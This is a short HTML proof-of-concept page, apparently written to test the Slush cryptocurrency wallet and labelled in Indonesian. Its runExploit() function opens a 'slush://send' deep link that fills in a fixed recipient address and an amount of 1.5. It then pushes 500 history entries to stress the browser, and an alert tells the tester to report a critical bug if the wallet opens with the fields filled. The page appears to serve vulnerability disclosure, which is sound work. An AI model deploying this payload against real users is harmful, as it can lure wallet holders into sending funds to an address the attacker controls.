<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC Simple | Slush Wallet</title>
    <style>
        body { background: #000; color: #ff0055; font-family: sans-serif; text-align: center; padding: 50px; }
        .box { border: 2px solid #ff0055; padding: 20px; border-radius: 10px; display: inline-block; }
        button { background: #ff0055; color: #fff; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h2>CRITICAL TEST</h2>
    <p style="color: #888;">Klik untuk tes Auto-fill & Bridge Stress</p>
    <button onclick="runExploit()">JALANKAN POC</button>
    <div id="status" style="margin-top: 15px; font-size: 12px; color: #00ff00;"></div>
</div>

<script>
    function runExploit() {
        const out = document.getElementById('status');
        
    
        const targetUri = "slush://send?to=0x742d35Cc6634C0532925a3b844Bc454e4438f44e&amount=1.5";
        window.location.href = targetUri;
        out.innerText = "Triggering: " + targetUri;

      
        for (let i = 0; i < 500; i++) {
            history.pushState(null, "", "#stress_" + i);
        }
        
        setTimeout(() => {
            alert("Cek Dompet: Jika terbuka dengan alamat & jumlah terisi, lapor sebagai CRITICAL.");
        }, 1000);
    }
</script>

</body>
</html>
